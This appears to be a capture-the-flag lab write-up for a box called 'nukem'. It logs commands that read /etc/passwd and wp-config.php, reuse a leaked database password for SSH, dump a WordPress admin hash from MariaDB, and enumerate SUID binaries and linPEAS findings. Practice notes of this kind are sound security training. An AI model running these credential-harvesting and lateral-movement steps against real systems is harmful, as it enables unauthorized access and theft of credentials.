# 4 box enum http > commander

```
[http@nukem simple-file-list]$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
[truncated]
commander:x:1000:1000::/home/commander:/bin/bash

[http@nukem http]$ cat wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );

# commander:CommanderKeenVorticons1990 works

# ssh in as commander

$ ssh commander@192.168.197.105

[commander@nukem ~]$ whoami;id
commander
uid=1000(commander) gid=1000(commander) groups=1000(commander)

[commander@nukem ~]$ ls -la
-rw-r--r--  1 commander commander   33 Sep  1 01:52 local.txt
drwxr-xr-x  2 commander commander 4096 Sep 18  2020 python_rest_flask

# in python_rest_flask
[commander@nukem python_rest_flask]$ ls -la
total 888
drwxr-xr-x  2 commander commander   4096 Sep 18  2020 .
drwxr-xr-x 10 commander commander   4096 Sep  1 02:22 ..
-rw-r--r--  1 commander commander     15 Sep 18  2020 .gitignore
-rw-r--r--  1 commander commander    417 Sep 18  2020 README.md
-rwxr-xr-x  1 commander commander 884736 Sep 18  2020 chinook.db
-rw-r--r--  1 commander commander    287 Sep 18  2020 requirements.txt
-rw-r--r--  1 commander commander   2552 Sep 18  2020 server.py

[commander@nukem python_rest_flask]$ file chinook.db
chinook.db: SQLite 3.x database, last written using SQLite version 3007006

# explored it; nothing useful

# mysql enum
[commander@nukem k]$ mysql -u commander -p
Enter password:
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+

MariaDB [wordpress]> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BoktR9dJnCOMHiLEnYkPfS1Ae/7vPq/ |
+------------+------------------------------------+
```

## SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/ksu
/usr/bin/expiry
/usr/bin/chage
/usr/bin/dosbox
/usr/bin/suexec
/usr/bin/sg
/usr/bin/unix_chkpwd
------------------------------
```

## PEAS

```
root         553  0.4  1.3 471932 26860 ?        Ss   01:51   0:10 /usr/bin/python /home/commander/python_rest_flask/server.py

╣ MySQL version
mysql  Ver 15.1 Distrib 10.5.5-MariaDB, for Linux (x86_64) using readline 5.1

╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      402/Xvnc

╣ Analyzing Http conf Files (limit 70)
-rw-r--r-- 1 root root 20330 Sep 18  2020 /etc/httpd/conf/httpd.conf

╣ Analyzing VNC Files (limit 70)
drwxr-xr-x 2 commander root 4096 Sep 18  2020 /home/commander/.vnc
-rw------- 1 commander commander 8 Sep 18  2020 /home/commander/.vnc/passwd

╣ Searching unexpected auth lines in /etc/pam.d/sshd
auth      include   system-remote-login

╣ Analyzing Interesting logs Files (limit 70)
-rw-r--r-- 1 root root 783170 Sep  1 02:24 /var/log/nginx/access.log

╣ Unexpected in root
/build_arch.sh
```
